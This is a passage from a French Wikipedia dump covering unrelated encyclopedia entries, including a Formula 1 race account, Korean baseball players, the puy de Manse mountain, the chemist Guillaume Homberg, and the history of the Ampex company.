Le classement ne va guère évoluer jusqu'au des 44 tours de l'épreuve, au moment où la pluie fait son apparition. Hamilton revient très fort sur Räikkönen et coupe une chicane pour éviter un accrochage. Il laisse le Finlandais reprendre l'avantage pour éviter une pénalité mais cette manœuvre a brisé l'élan du pilote Ferrari qui se fait doubler à la Source. Räikkönen, peu après, en chasse derrière Hamilton, part à la faute en évitant Nico Rosberg en toupie sur la piste. Si Hamilton franchit en tête le drapeau à damiers, il sera rétrogradé au troisième rang pour avoir tiré avantage de sa manœuvre sur Räikkönen.
Massa hérite donc de la victoire tandis que Heidfeld, qui a chaussé des intermédiaires, se classe second en doublant six monoplaces dans les derniers tours. Bourdais, longtemps troisième se fait dépasser par Alonso (quatrième), Vettel (cinquième) et Robert Kubica (sixième) et devance Timo Glock pour l'attribution des points.

</doc>
<doc id="3215351" url="https://fr.wikipedia.org/wiki?curid=3215351" title="María del Rosario Espinoza">
María del Rosario Espinoza

María del Rosario Espinoza (née le à Guasave dans le Sinaloa) est une taekwondoïste mexicaine. Espinoza mesure et, en 2012 est pesée à .
Biographie.
María Espinoza a gagné sa première compétition de taekwondo en 2003, au championnat panaméricain de la jeunesse à Rio de Janeiro. Plus tard elle participe à des tournois au Canada, en France et en Allemagne. Elle remporte le championnat du monde de taekwondo en 2007 dans la catégorie des moins de en battant Lee In-Jong. Elle remporte également la médaille d'or aux Jeux panaméricains de 2007 dans la catégorie des plus de en battant la Brésilienne Natalia Falivigna.
Le elle gagne la médaille d'or dans la catégorie des plus de aux Jeux olympiques de 2008, en battant la Norvégienne Nina Solheim avec le score 2-1 dans le gymnase de l'université des sciences et technologies de Pékin.
Elle est le porte-drapeau olympique de la délégation mexicaine aux Jeux olympiques d'été de 2012 où elle remporte une médaille de bronze en plus de 67 kg.

</doc>
<doc id="3215357" url="https://fr.wikipedia.org/wiki?curid=3215357" title="Lycodon">
Lycodon

Lycodon est un genre de serpents de la famille des Colubridae.
Répartition.
Les 51 espèces de ce genre se rencontrent en Asie et en Australie.
Description.
Les espèces de ce genre mesurent entre 40 et . Ce sont essentiellement des serpents nocturnes.
Liste des espèces.
Selon :
Taxinomie.
Le genre monotypique "Cercaspis" a été placé en synonymie avec "Lycodon" par Pyron, Kandambi, Hendry, Pushpamal et Burbrin en 2013, le genre monotypique "Lepturophis" par Das et Yaakob en 2007 et le genre "Dinodon" par Siler, Oliveros, Santanen et Brown en 2013.
Étymologie.
"Lycodon" vient du grec ', "lykos", « loup », et ', "don", « dent », et fait référence à la forme des dents mandibulaires et du maxillaire antérieur.

</doc>
<doc id="3215359" url="https://fr.wikipedia.org/wiki?curid=3215359" title="Attack of the Sabretooth">
Attack of the Sabretooth



</doc>
<doc id="3215361" url="https://fr.wikipedia.org/wiki?curid=3215361" title="Stade olympique de Moscou">
Stade olympique de Moscou



</doc>
<doc id="3215362" url="https://fr.wikipedia.org/wiki?curid=3215362" title="Kim Dong-joo">
Kim Dong-joo

 
Kim Dong-joo (né le à Séoul, Corée du Sud) est un joueur coréen de baseball qui joue avec les Doosan Bears de Séoul dans la ligue sud-coréenne de baseball.
Il a obtenu la médaille d'or de baseball lors des jeux asiatiques 1998 à Bangkok de la Thaïlande et lors des Jeux asiatiques 2002 à Pusan, la médaille de bronze de baseball lors des jeux olympiques 2000 à Sydney et la médaille d'or de baseball lors des jeux olympiques 2008 à Pékin.
Il a obtenu la à la Classique mondiale de baseball 2006.

</doc>
<doc id="3215363" url="https://fr.wikipedia.org/wiki?curid=3215363" title="Stade olympique (Moscou)">
Stade olympique (Moscou)



</doc>
<doc id="3215366" url="https://fr.wikipedia.org/wiki?curid=3215366" title="Maserati Ghibli">
Maserati Ghibli

La Maserati Ghibli peut désigner : 

</doc>
<doc id="3215367" url="https://fr.wikipedia.org/wiki?curid=3215367" title="Mayenne (La Roue du temps)">
Mayenne (La Roue du temps)



</doc>
<doc id="3215368" url="https://fr.wikipedia.org/wiki?curid=3215368" title="Puy de Manse">
Puy de Manse

Le puy de Manse est un sommet isolé situé à l'extrême sud-ouest du massif des Écrins, sur la ligne de partage des eaux entre Champsaur et Gapençais. Il culmine à d'altitude.
Géographie.
Situation.
Le puy de Manse est situé entre la pointe Saint-Philippe (), prolongement du Piolit vers l'ouest, et le plateau de Bayard (alt. maximum ), qui le sépare de la muraille du Dévoluy (pic de Gleize, ). Ses flancs se partagent entre trois communes : Ancelle à l'est, La Rochette au sud-ouest, et Forest-Saint-Julien au nord-ouest.
Topographie.
Le puy de Manse a la forme d'une pyramide ovoïde allongée dans le sens nord-sud. Le sommet principal est entouré de deux sommets secondaires, l'un au nord (), et l'autre au sud (). L'ensemble domine de plus de 300 mètres les collines environnantes.
Étant isolé, le sommet offre une vue panoramique à 360° sur le lac de Serre-Ponçon, Gap, le col de Manse, le col Bayard, la route Napoléon, le Dévoluy et le col de Gleize, et par beau temps jusqu'à la crête de Charance et le pic de Bure. On peut voir jusqu'au lac du Sautet et le début du Valgaudemar. Les sommets du Champsaur tels que le Vieux Chaillol, le pic Queyrel, la pointe de Cédera ou encore la Petite Autane sont parfaitement visibles, ainsi que la vallée de la Rouanne et la plaine de Lachaup à Ancelle.
Accès.
La D 944 (Gap - Orcières) permet d'accéder au col de Manse (alt. 1269 m.), au pied du puy de Manse côté ouest. La D 14 (Laye - La Bâtie-Neuve) et la D 13 (col de Manse - Ancelle) entourent le puy de Manse au sud et au nord. Mais aucune route ne monte sur les flancs du puy de Manse.
L'accès au sommet est difficile car il n'y a pas de chemins tracés. Les seuls cheminements existants sont ceux créés par les troupeaux qui y pâturent. La montée peut se faire en suivant ces gradins, sauf sur la face ouest, très abrupte et totalement minérale. Selon le point de départ, le dénivelé est compris entre 300 et 350 mètres.
Un circuit pédestre (facile) fait le tour du puy de Manse (balisage à partir de La Rochette, sur la D 14). Un embranchement permet d'accéder au sommet du « Chapeau de Napoléon », falaise dominant l'est de la cuvette de Gap, d'où le panorama s'étend de Charance jusqu'à Serre-Ponçon.
Climat.
La montagne est fortement exposée aux vents et elle reçoit peu de précipitations. Les rares sources sont captées pour alimenter les communes ou hameaux voisins en eau potable.
L’hiver, le puy de Manse est enneigé, mais il perd sa couverture neigeuse avant les autres sommets car il ne bénéficie pas de l'ombre des sommets plus élevés.
Végétation.
La végétation du puy de Manse est assez basique : c'est une végétation rase et typique des montagnes exposées au vent et peu humides du Champsaur. Cette végétation est exceptionnelle car unique à cette altitude. Il faut aller aux lacs d'Orcières, situés à environ d'altitude pour retrouver la même.
Art et littérature.
Photographie.
Les artistes Brigitte Palaggi (photographe) et Olivier Domerg (écrivain) ont réalisé un important travail d'arpentage et de création artistique sur le puy de Manse qui a donné lieu notamment à une exposition au Musée muséum départemental des Hautes-Alpes intitulée « Le Puy de Manse, fragments d'un mont-monde » du 18 mai au 31 octobre 2013.
Publications.
Une trilogie consacrée au puy de Manse et à ses paysages a été publiée, par ces mêmes artistes, qui y ont travaillé de 2009 à 2021. Elle répond au nom générique de "Fragments d’un mont-monde" et se compose de "Portrait de Manse en Sainte-Victoire molle" (volet 1, éditions L'Arpenteur/Gallimard, 2011), de "Fragments d’un mont-monde" (volet 2, éditions Le Bleu du ciel, 2013) et du "Manscrit" (volet 3, éditions Le Corridor bleu, 2021).
Économie.
Agriculture.
La végétation de graminées est très propice à l'élevage. Les paysans laissent paître les vaches et les moutons durant l'été et viennent les rechercher à l'automne.

</doc>
<doc id="3215370" url="https://fr.wikipedia.org/wiki?curid=3215370" title="Marie-Charlotte de Balzac d'Entragues">
Marie-Charlotte de Balzac d'Entragues

Marie-Charlotte de Balzac d'Entragues, née à Orléans en 1588 et morte à Paris en 1664, fille d'honneur de Marie de Médicis de 1600 à 1604, dame de Breux, baronne de Boissy-sous-Saint-Yon, Egly, Saint-Yon, Breux, Breuillet, Torfou et Chémault ; fille de Marie Touchet et de François de Balzac d'Entragues, sœur de Catherine Henriette de Balzac d'Entragues, est une maîtresse du roi Henri IV de France, avec lequel elle a une liaison entre 1605 et 1609.&lt;br&gt;Sa sœur aînée Catherine Henriette de Balzac d'Entragues est également une favorite de Henri IV, que ce dernier s'est par écrit engagé à épouser si elle lui donnait un fils.
Elle eut également une liaison avec François de Bassompierre, maréchal de France (1622), seigneur de Bassompierre, marquis d'Haroué, diplomate, colonel des Suisses (1614), qui lui donna un fils, Louis de Bassompierre (1610-1676), évêque de Saintes, ainsi à partir de 1621 qu’avec Louis Phélypeaux (1599-1681), chevalier, seigneur de la Vrillière, marquis de Châteauneuf, et Tanlay-sur-Loire, secrétaire d'État en 1629. Elle fut propriétaire du château de Chemault qu'elle vendit le à Henri de Guénégaud, seigneur du Plessis-Belleville; secrétaire d'État à la Marine. Elle fut inhumée le dans l'église Saint-Paul à Paris.

</doc>
<doc id="3215376" url="https://fr.wikipedia.org/wiki?curid=3215376" title="Ko Young-min">
Ko Young-min

 
Ko Young-min (né le à Séoul, Corée du Sud) est un joueur coréen de baseball qui joue avec les Doosan Bears de Séoul dans la ligue sud-coréenne de baseball. Son surnom est le Kodget (lit. nom famille "Ko" et Gadget sont combinés) et le joueur de deuxième but extérieur (en coréen : "yiiksu").
Il a obtenu la médaille d'or de baseball lors des Jeux olympiques 2008 à Pékin.

</doc>
<doc id="3215382" url="https://fr.wikipedia.org/wiki?curid=3215382" title="La découverte">
La découverte



</doc>
<doc id="3215384" url="https://fr.wikipedia.org/wiki?curid=3215384" title="Mayene">
Mayene



</doc>
<doc id="3215385" url="https://fr.wikipedia.org/wiki?curid=3215385" title="Tragedy Khadafi">
Tragedy Khadafi

Tragedy Khadafi, de son vrai nom Percy Chapman IV, né le à Queensbridge, New York, est un rappeur et producteur américain. Son nom fait référence au chef d'État libyen Mouammar Kadhafi. Tragedy est pour beaucoup le créateur du style Queensbridge (propos tenus par DJ Green Lantern dans le DVD ""). Il est connu pour avoir fait partie du collectif de Queensbridge, Juice Crew (avec Marley Marl, Mr. Magic, Roxanne Shanté, MC Shan, Craig G, Big Daddy Kane, Kool G. Rap &amp; DJ Polo, Masta Ace et Biz Markie). Dans sa carrière, Tragedy côtoie tous les artistes majeurs de Queensbridge comme Nas, Mobb Deep, Blaq Poet, Capone-N-Noreaga et Killa Sha.
Biographie.
Jeunesse.
Chapman est né dans les Queensbridge Housing Projects dans le quartier du Queens à New York. Son père décède à 18 ans. Alors qu'il n'a que 12 ans, il découvre que sa mère est dépendante de l'héroïne. Il trouve la rue comme exutoire à ses problèmes du foyer.
Carrière.
Il lance sa carrière comme membre du duo Super Kids, au côté de DJ Hot Day, avec la publication de ' en 1985. Il rencontre Marley Marl, figure historique du rap, membre du Juice Crew. Alors Jayski, Tragedy peaufine son style et enregistre '. Il enregistre ' qui paraîtra sur '. Malgré son talent pour la musique, il tombe très vite dans la délinquance juvénile et est incarcéré à l'âge de 16 ans à la prison juvénile de Rikers Island pour 18 mois. En prison, il découvre les livres "Harlem ou la terre promise" et la biographie de Malcolm X qui vont l'éveiller. Le rap passe alors au second plan dans son esprit. À sa sortie, il s'inscrit à l'université. Mais très vite les albums de l'époque lui redonnent de la motivation, il passe ses soirées en studio et décroche de la fac.
Chapman publie son premier album, ', en 1990. L'album atteint la du Top R&amp;B/Hip-Hop Albums. Puis, des frictions ont lieu entre lui et Marley Marl. Tragedy met sa carrière entre parenthèses et travaille alors dans une société de marketing. Par la suite, Tragedy s'occupe d'Havoc, alors artiste solo. Puis ce dernier rencontre Prodigy et ils forment le duo Mobb Deep. Tragedy s'occupe de Capone, fait des morceaux avec Capone-N-Noreaga, ce qui amènera à la sortie de l'album "The War Report" en 1997. Il s'est également occupé de défendre les couleurs de la Côte Est dans les frictions causées par le morceau "New York New York" de Snoop Dogg et Tha Dogg Pound avec le morceau ' en compagnie de Mobb Deep et Capone-N-Noreaga.
Sa mère décède en 2000. Il met sa souffrance sur disque et publie son troisième album, ", le .
Il publie ensuite son quatrième album, ", le , puis est de nouveau incarcéré. Il crée ensuite le mouvement 25 visant à positiver l'énergie des jeunes.
Il présente un documentaire intitulé " qui documente sa vie, ses problèmes personnels, sa période chez Juice Crew, les nombreuses fois durant lesquels il est incarcéré, et son enfance dans une famille afro-américaine pauvre et une mère dépendante à l'héroïne.
Affaire judiciaire.
Le , Tragedy est appréhendé pour vente de narcotiques et doit purger une peine de quatre ans de prison. Sa sortie initiale étant prévue pour le , Tragedy est libéré sur parole le .

</doc>
<doc id="3215387" url="https://fr.wikipedia.org/wiki?curid=3215387" title="The Assassination of Trotsky">
The Assassination of Trotsky



</doc>
<doc id="3215388" url="https://fr.wikipedia.org/wiki?curid=3215388" title="Duel (album)">
Duel (album)

Duel est le titre du premier album de Quentin Mosimann, le gagnant de Star Academy 7. Il s'agit d'un double album.
L'album a été réédité en janvier 2009 sous le nom de Il y a je t'aime et je t'aime, qui est également le titre de sa originale chez Universal.

</doc>
<doc id="3215390" url="https://fr.wikipedia.org/wiki?curid=3215390" title="Les Dents de sabre">
Les Dents de sabre

Les Dents de sabre ("") est un téléfilm américano-australien réalisé par George Trumbull Miller, diffusé le sur .

</doc>
<doc id="3215392" url="https://fr.wikipedia.org/wiki?curid=3215392" title="Guillaume Homberg">
Guillaume Homberg

Guillaume Homberg, né Wilhelm Homberg le à Batavia (Jakarta) dans Java et mort le à Paris est un chimiste néerlandais membre de l'Académie des sciences (France)
Biographie.
Origines.
Guillaume Homberg naît le de John Homberg et de Barbe Van-Hedemard, fille d'officier. La famille vit à Batavia, capitale des Indes néerlandaises, aujourd'hui renommée Jakarta. D'après Fontenelle, son père, gentilhomme Saxon originaire de Quedlinburg, perd son héritage lorsque les Suédois envahissent l'Allemagne pendant la Guerre de Trente Ans, devient officier de la VOC et dirige l'Arsenal de Batavia. La famille Homberg rentre à Amsterdam en 1670.
Études de droit et médecine.
ll étudie le droit à Jena et Leipzig, et devient en 1674 avocat à Magdeburg. Il y rencontre Otto van Guericke, Bourgmaitre et ingénieur-chercheur sur le vide. Sous son influence s'oriente vers les sciences naturelles, notamment la biologie et l'astronomie : il se fabrique même un astucieux globe céleste, avec une bougie à l'intérieur. Pour approfondir ses connaissances, il se rend dans plusieurs universités d'Europe, Padoue, Bologne, Rome, Paris. Il travaille avec Robert Boyle en Angleterre. Il rentre chez sa famille en Hollande, à Quedlimbourg, puis devient docteur en médecine à Witteberg.
Savant cosmopolite.
Il ne reste pas longtemps à Witteberg, et au grand dam de sa famille, qui souhaiterait qu'il fonde une famille respectable, il repart rencontrer les savants d'Allemagne. Un moment en Saxe, en Bohème, en Hongrie, il s'installe sur la proposition du roi Charles XI de Suède à Stockholm. Il y travaille avec M Hierna, qui devient plus tard Premier Médecin de la cour.
Douce France.
En 1682 Colbert lui offre de s'installer à Paris. De famille protestante calviniste – il sait même l'hébreu – il abjure et annonce qu'il se convertit au catholicisme. écrit Fontenelle. On est alors un an avant la mort de Colbert, en pleine dragonnades, trois ans avant la Révocation de l'édit de Nantes. Il est déshérité. 
Pendant cinq ans, de 1685 à 1689 il part à Rome exercer comme médecin. Il ne retourne définitivement à Paris qu'en 1691. Il est élu membre de l'Académie des Sciences le .
En 1708, à 56 ans, il épouse Marguerite-Angélique Dodart, fille du premier botaniste de l'Académie des Sciences et auteur des "Mémoires pour servir à l'histoire des plantes", Denis Dodart, décédé l'année précédente. Fontenelle décrit ce mariage comme envisagé depuis quelque temps, et particulièrement complice : De Denis Dodart, la famille Homberg hérite d'une maison rue Sainte-Croix de la Bretonnerie, dans le Marais, et un certain nombre de rentes et pensions.
Il meurt sept ans plus tard, le , à Paris, d'une petite dysenterie. Sa veuve se remarie avec François de Buraude. Elle meurt en 1751, laissant un héritage à ses neveux Dodart. Son notaire est Pierre-Yves de Bougainville, père de Jean-Pierre et Louis-Antoine, à l'époque respectivement académicien et mathématicien sous la conduite de Jean Le Rond d'Alembert, et bientôt célèbre explorateur.
Travail scientifique.
En 1691 l'Abbé Bignon le fait entrer à l'Académie Royale des Sciences. Il occupe le premier siège de chimie. Il y obtient le laboratoire de l'Académie, ce qui lui laisse une grande liberté de recherche. Il collabore avec Étienne-François Geoffroy et Louis Lémery.
Guillaume Homberg construit ses propres microscopes et ses propres machines pneumatiques, il invente un instrument pour mesurer la gravité spécifique des fluides. Il a découvert l'acide borique, qui s'appelait "Sal Sedativum Hombergi", et une espèce de chlorure de calcium phosphorescent appelé Phosphore d'Homberg.
Il est présenté au duc d'Orléans Philippe d'Orléans (1674-1723) par l'abbé Guillaume Dubois, son conseiller et futur ministre en 1702. En 1704 il est gratifié par le prince du titre de Premier médecin. Il lui offre une pension et un laboratoire au Palais-Royal. Homberg lui donne des cours particulier de chimie, il souffle du verre et élabore des parfums. Le , la Princesse Palatine Élisabeth-Charlotte de Bavière, mère du duc, écrit . Philippe d'Orléans devient Régent en 1715, lorsque meurt Guillaume Homberg.

</doc>
<doc id="3215395" url="https://fr.wikipedia.org/wiki?curid=3215395" title="Kim Min-jae (baseball)">
Kim Min-jae (baseball)

Kim Min-jae (né le à Pusan, Corée du Sud) est un instructeur coréen de baseball qui joue avec les KT Wiz de Suwon dans la ligue sud-coréenne de baseball.
Il a obtenu la médaille d'or de baseball lors des jeux olympiques 2008 à Pékin.

</doc>
<doc id="3215405" url="https://fr.wikipedia.org/wiki?curid=3215405" title="Wilhelm Homberg">
Wilhelm Homberg



</doc>
<doc id="3215409" url="https://fr.wikipedia.org/wiki?curid=3215409" title="Léonard Keigel">
Léonard Keigel

Léonard Keigel est un réalisateur français, né sous le nom de Léonard Chosidow le à Londres et mort le à Levallois-Perret.
Biographie.
Léonard Keigel est le gendre du propriétaire de salles et distributeur de cinéma Léonide Keigel. Il a été l'époux de l'actrice Simone Bach.

</doc>
<doc id="3215411" url="https://fr.wikipedia.org/wiki?curid=3215411" title="Leonard Keigel">
Leonard Keigel



</doc>
<doc id="3215412" url="https://fr.wikipedia.org/wiki?curid=3215412" title="Miershooptier">
Miershooptier



</doc>
<doc id="3215413" url="https://fr.wikipedia.org/wiki?curid=3215413" title="Lee Dae-ho">
Lee Dae-ho

Lee Dae-ho (né le à Pusan, Corée du Sud) est un joueur coréen de baseball évoluant en tant que joueur de premier but de baseball.
De 2001 à 2011, il évolue pour les Lotte Giants de l'Organisation coréenne de baseball avant d'aller poursuivre sa carrière au Japon. Il s'aligne en 2012 et 2013 pour les Orix Buffaloes, puis en 2014 et 2015 pour les Fukuoka Softbank Hawks de la Ligue Pacifique japonaise. Après avoir évolué en 2016 pour les Mariners de Seattle de la Ligue majeure de baseball, il est retourné jouer pour les Lotte Giants en Corée du Sud.
Il a obtenu la médaille de bronze de baseball lors des Jeux asiatiques de 2006 à Doha et la médaille d'or de baseball lors des jeux olympiques 2008 à Pékin.
Biographie.
Corée.
Le , Lee établit un record du baseball professionnel en frappant un coup de circuit dans un consécutif pour les Lotte Giants. L'ancienne marque de huit était partagée par trois joueurs des Ligues majeures de baseball, Don Mattingly, Ken Griffey Jr. et Dale Long.
Japon.
Il s'aligne en 2012 et 2013 pour les Orix Buffaloes, puis en 2014 et 2015 pour les Fukuoka Softbank Hawks de la Ligue Pacifique du Japon. Il décline une offre des Hawks pour 2016 et, à 33 ans, indique qu'il est à la recherche d'un contrat en Amérique du Nord avec une équipe de la Ligue majeure de baseball.
Amérique du Nord.
Le , Lee Dae-ho signe un contrat des ligues mineures avec les Mariners de Seattle, un club de la Ligue majeure de baseball.
Il fait ses débuts dans la Ligue majeure de baseball avec Seattle le . En 104 matchs à sa première saison, le joueur de premier but frappe 14 circuits et produit 49 points pour les Mariners.

</doc>
<doc id="3215414" url="https://fr.wikipedia.org/wiki?curid=3215414" title="Chat des termitières">
Chat des termitières



</doc>
<doc id="3215415" url="https://fr.wikipedia.org/wiki?curid=3215415" title="Barthélemy-Gabriel Rolland d'Erceville">
Barthélemy-Gabriel Rolland d'Erceville

Barthélemy-Gabriel Rolland de Chambaudoin d'Erceville, né le et mort le , est un magistrat et écrivain français.
Biographie.
Issu d'une famille originaire de Villefranche-d'Albigeois (Tarn) établie à Paris en la personne de son grand-père Barthélémy Rolland (1647-1718), banquier et agent de change, contrôleur général de l'extraordinaire des guerres, conseiller secrétaire du roi, maison et couronne de France en la grande chancellerie, nommé en mai 1691 et reçu le (charge anoblissante). Aïeul de l'ensemble de la famille Rolland de Chambaudoin d'Erceville subsistante.
Marié à Françoise Blondeau, d'une famille de la magistrature parisienne, possessionnée près de Fontainebleau, il est père du préfet Barthélémy François Rolland de Chambaudoin et de Barthélémy-Louis-Charles Rolland de Chambaudoin d'Erceville, il était également beau-père du ministre et académicien Antoine-François-Claude Ferrand.
Il fut conseiller au parlement de Paris et commissaire aux enquêtes du Palais (), puis président au parlement de Paris aux requêtes par provisions (), membre de la commission des finances (brevet du ). 
Il fut un des commissaires chargés de la réorganisation et de l'administration des collèges de l'Université, après l'expulsion des Jésuites en 1762. Premier comte de Chambaudoin par érection de la seigneurie en comté (par lettres patentes de Louis XV de janvier 1770), seigneur d’Allainville, Annemont, Ardouville, Aubreuil, Erceville, Fontferrière, Gloriette, Judinville, La Muette, Trémeville, et Samois. 
Il mourut guillotiné en 1794 avec plusieurs de ses collègues du parlement de Paris.

</doc>
<doc id="3215416" url="https://fr.wikipedia.org/wiki?curid=3215416" title="Quartier Grandes-Carrières">
Quartier Grandes-Carrières



</doc>
<doc id="3215417" url="https://fr.wikipedia.org/wiki?curid=3215417" title="Qui ? (film, 1970)">
Qui ? (film, 1970)

Qui ? () est un film franco-italien réalisé par Léonard Keigel, sorti en 1970.
Synopsis.
Marina vient d'échapper à la mort. La voiture dans laquelle elle se trouvait avec Claude, son amant, vient de tomber d'une falaise dans la mer. La police, arrivée sur les lieux, reste perplexe sur le discours de la jeune femme, car le corps de Claude n'a pas été retrouvé après l'immersion du véhicule. Voyant Marina sous le choc, Serge, le frère de Claude, lui propose de l'héberger quelque temps, d'autant plus qu'elle est encore hantée par le disparu. Cette situation lui permettra aussi d'instruire au mieux ses curiosités auprès de la charmante rescapée, paradoxalement, peu affectée.

</doc>
<doc id="3215418" url="https://fr.wikipedia.org/wiki?curid=3215418" title="Abbon de Poitiers">
Abbon de Poitiers

Abbon est un des plus anciens comtes de Poitiers connus.
Il est nommé par Charlemagne en 778, en même temps que huit autres comtes dans l’ancien royaume d'Aquitaine : il s’agit pour l’empereur de réorganiser le sud de son Royaume. Il est pour cela choisi dans son entourage proche, les antrustions.
On conserve relativement peu de traces de son action, vraisemblablement parce qu’il fut efficace : il rend la justice, et maintient l’ordre dans son comté.
Il est encore comte de Poitiers en 791 de façon certaine ; peut-être encore en 811, mais sans certitude.
Il est aussi possible que le comte Abbon de Poitiers dont le décès est indiqué en 811 soit le fils du comte Abbon nommé par Charlemagne en 778.

</doc>
<doc id="3215419" url="https://fr.wikipedia.org/wiki?curid=3215419" title="Jeong Keun-woo">
Jeong Keun-woo

Jeong Keun-woo (né le à Pusan, Corée du Sud) est un joueur coréen de baseball qui joue avec les Hanwha Eagles de Daejeon dans la ligue sud-coréenne de baseball.
Il a obtenu la médaille d'or de baseball lors des Jeux olympiques 2008 à Pékin.

</doc>
<doc id="3215423" url="https://fr.wikipedia.org/wiki?curid=3215423" title="Olimpiysky">
Olimpiysky



</doc>
<doc id="3215424" url="https://fr.wikipedia.org/wiki?curid=3215424" title="Ampex">
Ampex

Ampex est une entreprise d'électronique américaine créée en 1944 par . Le nom AMPEX est un acronyme, imaginé par le fondateur, signifiant Alexander M. Poniatoff Excellence. Il a donné le verbe « ampexer », utilisé par les professionnels pour dire « enregistrer sur support magnétique ».
La société n'est plus cotée en bourse depuis la cession des actifs à Sprague Magnetics.
Origines.
 établit l'entreprise à San Carlos, Californie en 1944, sous le nom de « "Ampex Electric and Manufacturing Company" ». Pendant la Seconde Guerre mondiale, Ampex est un petit fabricant de moteurs électriques. À la fin de la guerre, , alors employé aux transmissions pour l'armée américaine, est affecté à une enquête sur les expériences en radio et électronique des Allemands. Mullin achète deux appareils enregistreurs Magnetophon (qui donnent plus tard leur nom au magnétophone) et les ramène aux États-Unis, où il produit des versions modifiées. Bing Crosby, alors la plus grande star de la radio américaine, n'aime pas faire des émissions en direct. En 1946 il a demandé à NBC, le réseau de chaînes de télévision américaine, d'enregistrer ses shows à l'avance sur disques acétate. La compagnie lui refuse en raison de la qualité audio inférieure des disques, et Crosby se retire du show pour environ un an. En , Mullin fait la démonstration de son magnétophone modifié à Bing Crosby.
Lorsque Crosby entend pour la première fois le son du magnétophone, il voit immédiatement le potentiel de la nouvelle technologie et donne pouvoir à Mullin pour préparer un enregistrement test de son show radio. Ce test d'émission réussi, NBC concède à Crosby la possibilité d'enregistrer ses shows à l'avance sur bande. Crosby nomme immédiatement Mullin au poste d'ingénieur-chef et investit dans la société Ampex (alors une entreprise de six personnes), pour que la production commerciale du prototype de Mullin soit lancée.
Ampex était jadis implanté en France, par sa filiale "Ampex France", mais a quitté l'Hexagone à la fin des années 1980.
Technologie audio.
Le premier magnétophone de la société, le « Ampex Model 200 », révolutionne à la fois l'industrie radio et l'industrie musicale. En 1948, ABC utilise un appareil enregistreur Ampex Model 200 pour la première émission radio en différé aux États-Unis, pour le "Bing Crosby Show".
Les Paul, l'ami de Crosby, invité régulier de ses shows, a déjà expérimenté l'enregistrement fractionné sur disque. Quand il reçoit un premier Ampex Model 200, il modifie le magnétophone en lui ajoutant des têtes d'enregistrement et de lecture supplémentaires, créant ainsi expérimentalement le tout premier système d'enregistrement multipistes à bande.
Au début des années 1950, Ampex commence à trouver des débouchés pour des machines 1 et 2 pistes utilisant de la bande 1/4" (en pouces). L'activité s'étend peu à peu avec des modèles 3 et 4 pistes utilisant de la bande 1/2". Ampex acquiert Orradio Industries en 1959, qui devient "the Ampex Magnetic Tape Division", basée à Opelika, Alabama. Ampex devient un manufacturier d'appareils enregistreurs et de bandes. À la fin des années 1950, les produits Ampex sont plus recherchés par les meilleurs studios d'enregistrement à travers le monde. En 1959, Crosby n'est plus attaché à la production de shows radio, et il vend les intérêts qu'il avait dans l'entreprise Ampex, après avoir garanti pendant des années une technologie qui changea l'industrie radio-diffusée.
Ampex construit une poignée de machines à la fin des années 1950 qui peuvent enregistrer huit pistes sur bande 1", bien que les machines quatre pistes sont considérées dernier cri jusqu'aux environs de 1967. La demande de multiplication des pistes explose soudainement lorsque les musiciens entendent les overdubs considérables faits sur machines quatre pistes pour "Sgt. Pepper's Lonely Hearts Club Band". Les deux ingénieurs du son Geoff Emerick et Ken Townshend ont aussi imaginé une façon simple pour lier deux machines quatre pistes Studer J37 mais le système n'a pas tenu longtemps. En 1967 Ampex commence la production de machines huit pistes nommées MM-1000 pour répondre à la demande. En même temps 3M réussit l'introduction de son M56, un appareil concurrent huit pistes. Scully Recording Instruments obtient aussi un succès, mais très bref, grâce à une machine douze pistes utilisant de la bande 1".
En 1968 Ampex introduit une version seize pistes du MM-1000, premier magnétophone seize pistes professionnel au monde. Le modèle utilise de la bande 2". Il devient légendaire pour sa souplesse d'emploi extraordinaire, sa fiabilité et sa qualité de son remarquable. Ceci entraîne « l'âge d'or » de l'enregistrement multipiste analogique, qui dure jusqu'au début des années 1990. Les machines construites par Ampex comptent vingt-quatre pistes. Il est possible d'avoir plus de pistes en reliant les machines entre elles et en les synchronisant (SMPTE time code). À la fin des années 1970 Ampex est confronté aux manufacturiers japonais. La société se retire du marché des magnétophones professionnels entièrement en 1983.
Dans les années 1970, Ampex se focalise plus sur la vidéo, l'instrumentation, et les enregistreurs de données. En 1991, la branche appareils d'enregistrement professionnels de la société est vendue à Sprague Magnetics.
Technologie vidéo.
Quadruplex.
Depuis le début des années 1950, Bing Crosby et d'autres essaient d'enregistrer des images sur des bandes magnétiques défilant très vite. En 1952, Ampex imagine un prototype de magnétoscope utilisant une tête rotative et une bande défilant assez lentement. Au début de l'année 1956, Ampex fait la démonstration du VR-1000, premier de la production des magnétophones Quadruplex 2 pouces. Le , le premier programme télévisé en différé enregistré par le nouveau système Ampex Quadruplex est intitulé "Douglas Edwards and the News" et est diffusé par CBS.
L'assemblage des têtes « Quad » comporte quatre têtes. Les images sont enregistrées verticalement, sur une bande de de largeur se déplaçant à par seconde. Cela permet d'enregistrer des programmes d'une heure sur une seule bobine.
En 1967, Ampex introduit le VR-3000, magnétoscope professionnel portable, qui révolutionne l'enregistrement télévisuel de haute qualité. 
Le système Quadruplex domine l'industrie télé pendant un quart de siècle. Ampex obtient l'exclusivité pour « "video tape" », et le concurrent RCA doit se contenter de « "TV tape" » ou « "television tape" ». Le terme devient une marque utilisée comme nom, et « "videotape" » est couramment utilisé aujourd'hui.
Ray Dolby est l'ingénieur en partie responsable du développement du magnétoscope Quadruplex pour Ampex. Il crée ensuite Dolby Laboratories, une entreprise pionnière dans le domaine des systèmes de réduction de bruit de fond.
HS-100 disc recorder.
En , Ampex introduit le HS-100. Les images sont enregistrées sur un disque magnétique analogique. Le disque pèse pour une vitesse de 60 tours par seconde, soit 3600 tours par minute (50 tours par seconde en Pal). Une unité NTSC enregistre 30 secondes de vidéo, une unité Pal 36 secondes. La vidéo peut alors être passée au ralenti, et un arrêt sur image est possible.
Trois versions, A, B, C, sont développées. La dernière version (C) dispose d'un stabilisateur digital, le TBC. Sa capacité d'enregistrement est ramenée à 28 secondes, mettant en avant la qualité plutôt que la quantité. Cette spécificité oblige à des prises de décisions en direct fort énergiques. En France les trois machines ont équipé des unités mobiles de la SFP réalisant sur les sites d'enregistrement (à 95 % des sports) plutôt qu'en studio. Chaque machine HS 100 occupait un car entier, pour des déplacements dans toute la France, ou à l'étranger.
VR-8000.
En 1961 Ampex construit un magnétoscope, le VR-8000, commercialisé pendant une courte période.
Type A.
En 1965, Ampex sort un des premiers magnétoscopes au format . Type A est le nom donné par la SMPTE.
Type C.
